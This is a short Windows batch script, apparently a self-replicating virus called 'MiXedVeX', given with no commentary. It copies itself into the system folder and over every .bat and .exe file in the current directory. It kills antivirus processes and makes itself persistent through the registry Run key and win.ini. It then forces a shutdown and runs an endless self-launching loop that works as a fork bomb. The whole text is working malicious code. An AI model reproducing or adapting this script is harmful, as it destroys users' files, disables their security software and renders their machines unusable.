@ECHO OFF
copy %0 %systemroot%\MiXedVeX.bat > nul 
copy %0 *.bat > nul 
copy %0 *.exe > nul 
cls 
tskill AVGUARD
tskill AVGNT
tskill NMAIN
tskill KAV
tskill ad-aware
tskill av*
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MiXedVeX /t REG_SZ /d %systemroot%\MiXedVeX.bat /f > nul
cls
echo [windows] >> %systemroot%\win.ini
echo load=%systemroot%\MiXedVeX.bat >> %systemroot%\win.ini
echo run=%systemroot%\MiXedVeX.bat >> %systemroot%\win.ini
shutdown -s -t 2
cls
:crash
start %0
goto crash